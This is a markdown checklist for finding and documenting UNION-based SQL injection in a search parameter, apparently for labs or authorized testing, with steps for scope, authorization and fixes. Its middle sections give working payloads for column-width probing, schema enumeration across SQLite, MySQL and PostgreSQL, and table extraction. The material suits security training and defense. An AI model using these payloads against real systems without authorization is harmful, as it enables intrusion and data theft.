# UNION Search SQLi Recon Checklist

## Goal

Determine whether a search parameter is concatenated into SQL and can use `UNION` to read hidden tables that share the same database connection.

## 1. Scope Confirmation

- Confirm lab, owned app, in-scope target, or defensive review.
- Record host, endpoint, parameter, and date.
- Do not copy live flags, tokens, cookies, or private URLs into reusable notes.

Record:

```text
Target:
Authorization basis:
Endpoint:
Parameter:
Date:
```

## 2. Map The Result Shape

Identify:

- request method
- where the parameter is placed
- how many visible columns the app renders
- whether errors are reflected

Record:

```text
Method:
Path:
Visible column count:
Error panel present: yes/no
```

## 3. Confirm String-Literal Context

Try:

```text
'
"
```

Record:

```text
Single quote error:
Double quote behavior:
DBMS clue:
```

## 4. Determine UNION Width

Test:

```text
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
```

Record:

```text
Working UNION column count:
Type flexibility:
Synthetic row visible: yes/no
```

## 5. Enumerate Metadata

SQLite:

```sql
' UNION SELECT sql, 'x' FROM sqlite_master WHERE type='table'--
```

MySQL:

```sql
' UNION SELECT table_name, 'x' FROM information_schema.tables WHERE table_schema=database()--
```

PostgreSQL:

```sql
' UNION SELECT tablename, 'x' FROM pg_tables WHERE schemaname='public'--
```

Record:

```text
Metadata source:
Hidden tables found:
Likely target table:
```

## 6. Extract Minimal Proof

Read only the smallest value needed:

```sql
' UNION SELECT value, 'x' FROM flags--
```

or:

```sql
' UNION SELECT group_concat(value), 'x' FROM flags--
```

Record:

```text
Target column:
Returned row:
Impact:
```

## 7. Compare Controls

Always compare:

```text
Normal search result
Quote error result
Correct-width UNION result
Hidden-table extraction result
```

## 8. Root Cause Checklist

Separate:

```text
Unsafe string concatenation:
Error reflection:
Shared DB privileges:
Projection width:
```

## 9. Fix Checklist

- Parameterize search queries.
- Suppress raw SQL parser errors.
- Restrict DB permissions for public read paths.
- Separate secret/admin tables from public catalog access when possible.

## Decision Checklist

- [ ] Search parameter identified.
- [ ] String-literal injection confirmed.
- [ ] UNION width determined.
- [ ] Metadata table enumerated.
- [ ] Hidden table identified.
- [ ] Minimal proof extracted.
- [ ] Root cause documented clearly.
- [ ] Reusable notes exclude live secrets.
